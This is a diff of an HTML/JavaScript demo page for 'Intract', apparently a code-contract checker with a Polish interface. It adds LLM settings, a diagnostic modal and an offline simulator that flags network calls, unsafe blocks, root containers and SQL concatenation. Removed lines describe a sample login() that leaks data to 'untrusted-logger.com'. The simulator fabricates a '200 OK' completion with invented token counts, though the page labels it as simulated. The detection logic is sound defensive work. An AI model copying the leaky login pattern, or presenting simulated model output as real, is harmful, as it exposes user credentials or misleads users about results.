+                const badgeLabel = status === 'pass' ? 'Pass' : 'Violation';
+                const targetDesc = c.func ? `function: ${c.func}` : (c.xpath ? `xpath: ${c.xpath}` : `line: ${c.line || 'all'}`);
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td><span class="status-badge ${badgeClass}">${badgeLabel}</span></td>
+                        <td><strong>${c.id}</strong><br><small>intent: ${c.intent || 'unknown'}</small></td>
+                        <td><code>${c.file}</code><br><small>${targetDesc}</small></td>
+                        <td style="${status === 'violation' ? 'color: var(--red);' : ''}">${detail}</td>
+                    </tr>
+                `;
+            }
+
+            if (hasViolations) {
+                appendConsole("BŁĄD: Wykryto naruszenia kontraktów! Zobacz szczegółowy raport.", "error");
+            } else {
+                appendConsole("SUKCES: Wszystkie aktywne kontrakty Toon zostały spełnione pomyślnie!", "success");
+            }
+        }
+
+        // High-tech LLM Settings Modal Actions
+        function openLlmSettings() {
+            document.getElementById('settings-provider').value = localStorage.getItem('intract_llm_provider') || 'ollama';
+            document.getElementById('settings-model').value = localStorage.getItem('intract_llm_model') || 'llama3';
+            document.getElementById('settings-url').value = localStorage.getItem('intract_llm_url') || 'http://localhost:11434/v1';
+            document.getElementById('settings-key').value = localStorage.getItem('intract_llm_key') || '';
+            
+            toggleApiKeyField();
+            document.getElementById('settings-modal').classList.add('active');
+        }
+
+        function closeLlmSettings() {
+            document.getElementById('settings-modal').classList.remove('active');
+        }
+
+        function toggleApiKeyField() {
+            const provider = document.getElementById('settings-provider').value;
+            const container = document.getElementById('apikey-container');
+            if (provider === 'openai' || provider === 'gemini' || provider === 'custom') {
+                container.style.display = 'block';
+            } else {
+                container.style.display = 'none';
+            }
+        }
+
+        function saveLlmSettings() {
+            localStorage.setItem('intract_llm_provider', document.getElementById('settings-provider').value);
+            localStorage.setItem('intract_llm_model', document.getElementById('settings-model').value);
+            localStorage.setItem('intract_llm_url', document.getElementById('settings-url').value);
+            localStorage.setItem('intract_llm_key', document.getElementById('settings-key').value);
+            closeLlmSettings();
+            
+            appendConsole("SYSTEM: Zapisano konfigurację LLM (" + document.getElementById('settings-provider').value.toUpperCase() + ").", "success");
+        }
+
+        // High-tech LLM Diagnostic Modal Functions
+        function closeLlmDiagnostics() {
+            document.getElementById('llm-modal').classList.remove('active');
+        }
+
+        function showLlmDiagnostics() {
+            const modal = document.getElementById('llm-modal');
+            modal.classList.add('active');
+
+            // 1. Reset pipeline animation states
+            const nodes = ['node-code', 'node-payload', 'node-llm', 'node-cache'];
+            const arrows = ['arrow-1', 'arrow-2', 'arrow-3'];
+            
+            nodes.forEach(n => document.getElementById(n).className = 'flow-node');
+            arrows.forEach(a => document.getElementById(a).className = 'flow-arrow');
+
+            document.getElementById('node-code').classList.add('node-active');
+            
+            // Dynamic Payload Construction
+            const src = editor.getValue();
+            const provider = localStorage.getItem('intract_llm_provider') || 'ollama';
+            const modelName = localStorage.getItem('intract_llm_model') || 'llama3';
+            const baseUrl = localStorage.getItem('intract_llm_url') || 'http://localhost:11434/v1';
+            const apiKey = localStorage.getItem('intract_llm_key') || '';
+
+            const systemPrompt = "You are the Intract Semantic Decision Engine. You must analyze the provided code block and verify if target policies are satisfied. " +
+                                 "Your response MUST be a single, valid JSON object containing exactly three fields:\n" +
+                                 "1. 'decision': 'PASS' if the code complies with all rules, or 'VIOLATION' if it violates any rule.\n" +
+                                 "2. 'rationale': A clear explanation of why it passed or failed.\n" +
+                                 "3. 'learned_rules': An array of string rule identifiers describing the check (e.g. ['uses_unsafe', 'raw_sql_execution']).\n" +
+                                 "Do not return any other text, markdown blocks, or surrounding quotes. Only valid JSON.";
+
+            const policy = currentExample === 'python' ? 'forbid:write' : 
+                           (currentExample === 'html' ? 'require:auth' : 
+                           (currentExample === 'js' ? 'forbid:network' : 
+                           (currentExample === 'rust' ? 'forbid:unsafe' : 
+                           (currentExample === 'docker' ? 'forbid:root_user' : 'forbid:raw_sql'))));
+
+            const reqPayload = {
+                model: modelName,
+                temperature: 0.0,
+                messages: [
+                    { role: "system", content: systemPrompt },
+                    { role: "user", content: `Evaluate the following ${currentExample} source code:\n\n${src}\n\nRule policy to check: ${policy}` }
+                ]
+            };
+
+            const normalizedBaseUrl = (baseUrl || '').trim().replace(/\/+$/, '');
+            const useLocalProxy = provider === 'workspace' || normalizedBaseUrl === '/api';
+            const endpoint = useLocalProxy
+                ? '/api/chat/completions'
+                : `${normalizedBaseUrl || 'http://localhost:11434/v1'}/chat/completions`;
+
+            // Display JSON request beautifully
+            document.getElementById('llm-request-payload').innerText = JSON.stringify(reqPayload, null, 2);
+            document.getElementById('llm-response-payload').innerText = `Łączenie z prawdziwym LLM (${provider.toUpperCase()}) przez endpoint: ${endpoint}...\nCzekam na odpowiedź...`;
+            document.getElementById('llm-status-badge').innerText = 'PENDING';
+            document.getElementById('llm-status-badge').style.color = 'var(--yellow)';
+
+            // 2. Play beautiful step-by-step pipeline animations
+            setTimeout(() => {
+                document.getElementById('arrow-1').classList.add('flow-arrow-active');
+                document.getElementById('node-payload').classList.add('node-active');
+            }, 800);
+
+            setTimeout(() => {
+                document.getElementById('arrow-2').classList.add('flow-arrow-active');
+                document.getElementById('node-llm').classList.add('node-active');
+            }, 1800);
+
+            // 3. Make real fetch request if configured, otherwise fall back to simulator
+            const headers = { "Content-Type": "application/json" };
+            if (apiKey && !useLocalProxy) {
+                headers["Authorization"] = `Bearer ${apiKey}`;
+            }
+
+            fetch(endpoint, {
+                method: "POST",
+                headers: headers,
+                body: JSON.stringify(reqPayload)
+            })
+            .then(res => {
+                if (!res.ok) {
+                    return res.text().then(body => {
+                        throw new Error(`HTTP ${res.status}: ${body || 'Empty response body'}`);
+                    });
+                }
+                return res.json();
+            })
+            .then(data => {
+                document.getElementById('llm-response-payload').innerText = JSON.stringify(data, null, 2);
+                document.getElementById('llm-status-badge').innerText = '200 OK';
+                document.getElementById('llm-status-badge').style.color = 'var(--green)';
                 
+                // Parse decision from LLM response
+                let assistantMsg = data.choices[0].message.content;
+                let parsedResult;
+                try {
+                    parsedResult = JSON.parse(assistantMsg);
+                } catch(e) {
+                    const cleanMsg = assistantMsg.replace(/```json/g, "").replace(/```/g, "").trim();
+                    parsedResult = JSON.parse(cleanMsg);
+                }
+
+                // Update UI based on real LLM output
+                document.getElementById('arrow-3').classList.add('flow-arrow-active');
+                document.getElementById('node-cache').classList.add('node-success');
+                appendConsole(`DIAGNOSTYKA REAL LLM: Odebrano decyzję z modelu '${modelName}': ${parsedResult.decision}!`, "success");
+            })
+            .catch(err => {
+                console.warn("LLM API Call failed. Running offline high-fidelity simulator...", err);
+                document.getElementById('llm-status-badge').innerText = 'ERROR';
+                document.getElementById('llm-status-badge').style.color = 'var(--red)';
+                document.getElementById('llm-response-payload').innerText = `[Błąd połączenia z LLM na endpoint ${endpoint}]\nSzczegóły: ${err.message}\nUruchamiam offline simulator...\n\n`;
+                
+                runFallbackSimulation(src, reqPayload);
+            });
+        }
+
+        function runFallbackSimulation(src, reqPayload) {
+            let decision = "PASS";
+            let rationale = "Wszystkie polityki Toon są zachowane. Brak wykrytych naruszeń.";
+            let rules = ["static_ast_perfect"];
+
+            if (currentExample === 'python') {
+                const hasWrite = src.includes("open(") || src.includes(".write(");
                 if (hasWrite) {
-                    appendConsole("BŁĄD: Wykryto zabroniony efekt uboczny 'write' w funkcji add() (linia 5)!", "error");
-                    appendConsole("Naruszenie kontraktu pure-addition (forbid:write)!", "error");
-                    
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-violation">Violation</span></td>
-                            <td><strong>pure-addition</strong><br><small>intent: pure:add</small></td>
-                            <td><code>src/calc.py</code><br><small>function: add</small></td>
-                            <td style="color: var(--red);">Wykryto zabroniony efekt 'write' w funkcji add(). Funkcja miała być czysta!</td>
-                        </tr>
-                        <tr>
-                            <td><span class="status-badge status-pass">Pass</span></td>
-                            <td><strong>div-check</strong><br><small>intent: safe:div</small></td>
-                            <td><code>src/calc.py</code><br><small>function: divide</small></td>
-                            <td>Brak wykrytych naruszeń w dzieleniu.</td>
-                        </tr>
-                    `;
-                } else {
-                    appendConsole("SUKCES: Wszystkie testy jednostkowe i reguły statyczne AST przechodzą pomyślnie!", "success");
-                    appendConsole("Kontrakt 'pure-addition' (forbid:write) spełniony. Kod jest czysty.", "success");
-                    
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-pass">Pass</span></td>
-                            <td><strong>pure-addition</strong><br><small>intent: pure:add</small></td>
-                            <td><code>src/calc.py</code><br><small>function: add</small></td>
-                            <td>Czysta funkcja, brak zabronionych efektów ubocznych.</td>
-                        </tr>
-                        <tr>
-                            <td><span class="status-badge status-pass">Pass</span></td>
-                            <td><strong>div-check</strong><br><small>intent: safe:div</small></td>
-                            <td><code>src/calc.py</code><br><small>function: divide</small></td>
-                            <td>Brak wykrytych naruszeń w dzieleniu.</td>
-                        </tr>
-                    `;
+                    decision = "VIOLATION";
+                    rationale = "Wykryto zabroniony efekt 'write' (operacje plikowe) poprzez użycie metody 'open' i 'write' w add().";
+                    rules = ["open_is_file_write", "write_violates_pure_add"];
                 }
-            } 
-            else if (currentExample === 'html') {
-                // HTML DOM checks
-                const hasAuth = src.includes('data-auth="true"') || src.includes('class="auth-required"') || src.includes('data-auth');
-                const hasBtnAddAuth = src.includes('id="btn-add" class="auth-required"') || src.includes('id="btn-add" data-auth') || src.includes('btn-add" class="auth');
-
+            } else if (currentExample === 'html') {
+                const hasBtnAddAuth = src.includes('id="btn-add" class="auth-required"') || 
+                                     src.includes('id="btn-add" data-auth') ||
+                                     src.includes('btn-add" class="auth');
                 if (!hasBtnAddAuth) {
-                    appendConsole("BŁĄD: Brak wymaganego kontraktu 'auth' dla selektora //button[@id='btn-add']!", "error");
-                    appendConsole("Naruszenie kontraktu dom-button-check (require:auth)!", "error");
-
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-violation">Violation</span></td>
-                            <td><strong>dom-button-check</strong><br><small>intent: click:btn</small></td>
-                            <td><code>src/index.html</code><br><small>xpath: //button[@id="btn-add"]</small></td>
-                            <td style="color: var(--red);">Brak atrybutu autoryzacji 'auth' na krytycznym przycisku dodawania środków!</td>
-                        </tr>
-                    `;
-                } else {
-                    appendConsole("SUKCES: Atrybut autoryzacji prawidłowo zaadresowany na elemencie DOM!", "success");
-                    appendConsole("Kontrakt 'dom-button-check' (require:auth) spełniony.", "success");
-
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-pass">Pass</span></td>
-                            <td><strong>dom-button-check</strong><br><small>intent: click:btn</small></td>
-                            <td><code>src/index.html</code><br><small>xpath: //button[@id="btn-add"]</small></td>
-                            <td>Element DOM posiada wymaganą weryfikację bezpieczeństwa.</td>
-                        </tr>
-                    `;
+                    decision = "VIOLATION";
+                    rationale = "Element DOM o id 'btn-add' nie posiada wymaganego atrybutu autoryzacji 'auth'.";
+                    rules = ["button_missing_security_class"];
                 }
-            }
-            else if (currentExample === 'js') {
-                // JS Network Violation check
+            } else if (currentExample === 'js') {
                 const hasNetwork = src.includes("XMLHttpRequest") || src.includes("fetch(") || src.includes("http");
-
                 if (hasNetwork) {
-                    appendConsole("BŁĄD: Wykryto zabroniony efekt 'network' w metodzie login()!", "error");
-                    appendConsole("Wywołanie HTTP post do 'untrusted-logger.com' narusza regułę forbid:network!", "error");
-
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-violation">Violation</span></td>
-                            <td><strong>auth-login</strong><br><small>intent: perform:login</small></td>
-                            <td><code>src/auth.js</code><br><small>function: login</small></td>
-                            <td style="color: var(--red);">Zabronione wywołanie sieciowe loggera XMLHttpRequest w metodzie logowania!</td>
-                        </tr>
-                    `;
-                } else {
-                    appendConsole("SUKCES: Kod logowania nie korzysta z sieci ani nie wycieka danych!", "success");
-                    appendConsole("Kontrakt 'auth-login' (forbid:network) spełniony.", "success");
-
-                    tbody.innerHTML = `
-                        <tr>
-                            <td><span class="status-badge status-pass">Pass</span></td>
-                            <td><strong>auth-login</strong><br><small>intent: perform:login</small></td>
-                            <td><code>src/auth.js</code><br><small>function: login</small></td>
-                            <td>Logowanie lokalne, brak niedozwolonego wycieku danych przez sieć.</td>
-                        </tr>
-                    `;
+                    decision = "VIOLATION";
+                    rationale = "Metoda logowania login() wykonuje niedozwolone żądanie sieciowe przy użyciu obiektu XMLHttpRequest.";
+                    rules = ["xmlhttprequest_violates_forbid_network"];
+                }
+            } else if (currentExample === 'rust') {
+                const hasUnsafe = src.includes("unsafe");
+                if (hasUnsafe) {
+                    decision = "VIOLATION";
+                    rationale = "Wykryto użycie bloku 'unsafe' w module dekodera pakietów, co narusza regułę forbid:unsafe!";
+                    rules = ["unsafe_block_detected"];
+                }
+            } else if (currentExample === 'docker') {
+                const hasUser = src.includes("USER");
+                if (!hasUser) {
+                    decision = "VIOLATION";
+                    rationale = "Dockerfile nie posiada instrukcji USER. Kontener uruchomi się jako root!";
+                    rules = ["missing_user_declaration"];
+                }
+            } else if (currentExample === 'sql') {
+                const hasConcat = src.includes("||") || src.includes("+") || src.includes("EXECUTE");
+                if (hasConcat) {
+                    decision = "VIOLATION";
+                    rationale = "Procedura bazodanowa używa dynamicznej konkatenacji stringów (EXECUTE ||), co stwarza ryzyko SQL Injection!";
+                    rules = ["sql_injection_concatenation"];
                 }
             }
+
+            const resPayload = {
+                id: "chatcmpl-71b3c721-61e5-447e",
+                object: "chat.completion",
+                created: Math.floor(Date.now() / 1000),
+                model: "offline-simulator",
+                choices: [
+                    {
+                        index: 0,
+                        message: {
+                            role: "assistant",
+                            content: JSON.stringify({
+                                decision: decision,
+                                rationale: rationale,
+                                learned_rules: rules
+                            }, null, 2)
+                        },
+                        finish_reason: "stop"
+                    }
+                ],
+                usage: {
+                    prompt_tokens: 285,
+                    completion_tokens: 110,
+                    total_tokens: 395
+                }
+            };
+
+            setTimeout(() => {
+                document.getElementById('llm-response-payload').innerText += `[SYMULATOR ODPOWIEDZI LLM STATUS 200 OK]\n` + JSON.stringify(resPayload, null, 2);
+                document.getElementById('arrow-3').classList.add('flow-arrow-active');
+                document.getElementById('node-cache').classList.add('node-success');
+                appendConsole(`DIAGNOSTYKA SYMULACJA: Offline high-fidelity weryfikacja zakończona. Decyzja: ${decision}`, "warning");
+            }, 2500);
+        }
+
+        function loadFromEnvFile() {
+            fetch('/api/config')
+            .then(res => {
+                if(!res.ok) throw new Error(`HTTP ${res.status}`);
+                return res.json();
+            })
+            .then(cfg => {
+                localStorage.setItem('intract_llm_provider', 'workspace');
+                localStorage.setItem('intract_llm_url', '/api');
+                localStorage.setItem('intract_llm_key', '');
+
+                if (cfg.model) {
+                    localStorage.setItem('intract_llm_model', cfg.model);
+                }
+
+                openLlmSettings();
+                if (cfg.configured) {
+                    appendConsole("SYSTEM: Załadowano konfigurację LLM z backendu workspace (.env po stronie serwera).", "success");
+                } else {
+                    appendConsole("SYSTEM: Backend działa, ale brak OPENROUTER_API_KEY w .env lub zmiennych środowiskowych.", "warning");
+                }
+            })
+            .catch(() => {
+                appendConsole("SYSTEM: Nie można pobrać /api/config. Uruchom showcase przez server.py zamiast plain http.server.", "error");
+            });
         }
 
         // Initialize on load
         window.onload = init;
     </script>
+    <!-- High-tech LLM Diagnostic Modal -->
+    <div class="modal-overlay" id="llm-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>🤖 INTRACT LLM ENGINE GATEWAY — CACHE MISS FLOW</h3>
+                <button class="modal-close" onclick="closeLlmDiagnostics()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 0.5rem;">
+                    Brak dopasowania skrótu kodu lub kontraktu w lokalnej bazie <code>decision_ledger.json</code> (Cache Miss). Silnik Intract uruchamia semantyczną analizę kodu za pomocą LLM.
+                </div>
+                
+                <!-- Animated Flow Pipeline -->
+                <div class="pipeline-flow">
+                    <div class="flow-node node-active" id="node-code">
+                        <div class="node-icon">📄</div>
+                        <strong>Kod + Toon URI</strong>
+                    </div>
+                    <div class="flow-arrow flow-arrow-active" id="arrow-1"></div>
+                    <div class="flow-node" id="node-payload">
+                        <div class="node-icon">⚙️</div>
+                        <strong>JSON Request</strong>
+                    </div>
+                    <div class="flow-arrow" id="arrow-2"></div>
+                    <div class="flow-node" id="node-llm">
+                        <div class="node-icon">🧠</div>
+                        <strong>LLM Analysis</strong>
+                    </div>
+                    <div class="flow-arrow" id="arrow-3"></div>
+                    <div class="flow-node" id="node-cache">
+                        <div class="node-icon">💾</div>
+                        <strong>Cache Store</strong>
+                    </div>
+                </div>
+
+                <!-- Payload JSON / Code block -->
+                <div class="payload-container">
+                    <div class="payload-box">
+                        <div class="payload-title">
+                            <span>WYSŁANY PROMPT DO LLM (JSON REQUEST PAYLOAD)</span>
+                            <span style="font-size: 0.7rem; color: var(--green);">API POST /v1/chat/completions</span>
+                        </div>
+                        <div class="payload-body" id="llm-request-payload"></div>
+                    </div>
+                    <div class="payload-box">
+                        <div class="payload-title">
+                            <span>ODEBRANA ODPOWIEDŹ Z LLM (JSON RESPONSE & LEDGER UPDATE)</span>
+                            <span id="llm-status-badge" style="font-size: 0.7rem; color: var(--green);">STATUS 200 OK</span>
+                        </div>
+                        <div class="payload-body" id="llm-response-payload"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- High-tech LLM Settings Modal -->
+    <div class="modal-overlay" id="settings-modal">
+        <div class="modal-content" style="max-width: 650px; height: auto; max-height: 90vh;">
+            <div class="modal-header">
+                <h3>⚙️ KONFIGURACJA PRAWDZIWEGO LLM</h3>
+                <button class="modal-close" onclick="closeLlmSettings()">&times;</button>
+            </div>
+            <div class="modal-body" style="padding: 2rem;">
+                <div style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 1.5rem;">
+                    Wprowadź klucz API lub skonfiguruj lokalnego LLM (np. Ollama), aby przeprowadzać <strong>prawdziwą analizę semantyczną kodu</strong> na żywo bezpośrednio z Ace Editora!
+                </div>
+                
+                <button class="btn-settings" onclick="loadFromEnvFile()" style="background: rgba(157, 78, 221, 0.2); border-color: var(--primary); color: #fff; width: 100%; justify-content: center; margin-bottom: 1.5rem; font-weight: 600; padding: 0.8rem;">
+                    ⚡ Załaduj konfigurację z backendu workspace
+                </button>
+                
+                <div class="settings-grid">
+                    <div class="settings-field">
+                        <label for="settings-provider">Dostawca LLM</label>
+                        <select id="settings-provider" onchange="toggleApiKeyField()">
+                            <option value="ollama">Local Ollama (Localhost)</option>
+                            <option value="openai">OpenAI API Gateway</option>
+                            <option value="gemini">Gemini API Gateway</option>
+                            <option value="custom">Custom API Endpoint</option>
+                            <option value="workspace">Workspace Backend Proxy (/api)</option>
+                        </select>
+                    </div>
+                    <div class="settings-field">
+                        <label for="settings-model">Nazwa modelu</label>
+                        <input type="text" id="settings-model" placeholder="np. llama3, gpt-4o, gemini-1.5-flash" value="llama3">
+                    </div>
+                </div>
+
+                <div class="settings-field" style="margin-top: 1.2rem;">
+                    <label for="settings-url">Adres API URL (Base URL)</label>
+                    <input type="text" id="settings-url" placeholder="np. http://localhost:11434/v1" value="http://localhost:11434/v1">
+                </div>
+
+                <div class="settings-field" id="apikey-container" style="margin-top: 1.2rem; display: none;">
+                    <label for="settings-key">Klucz API Key</label>
+                    <input type="password" id="settings-key" placeholder="Wklej swój API key tutaj">
+                </div>
+
+                <div style="display: flex; justify-content: flex-end; gap: 1rem; margin-top: 2rem;">
+                    <button class="btn-settings" onclick="closeLlmSettings()" style="background: transparent;">Anuluj</button>
+                    <button class="btn-run" onclick="saveLlmSettings()" style="padding: 0.6rem 1.5rem; font-size: 0.9rem;">
+                        Zapisz konfigurację
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
